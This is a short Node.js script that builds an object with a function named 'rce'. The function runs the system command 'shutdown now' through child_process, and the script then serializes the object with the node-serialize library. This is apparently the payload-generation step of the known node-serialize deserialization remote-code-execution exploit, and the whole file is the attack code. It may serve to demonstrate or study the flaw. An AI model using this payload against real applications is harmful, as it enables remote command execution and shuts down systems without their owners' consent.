var y = {
 rce : function (){require('child_process').exec('shutdown now', function(error, stdout, stderr) { console.log(stdout) });},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
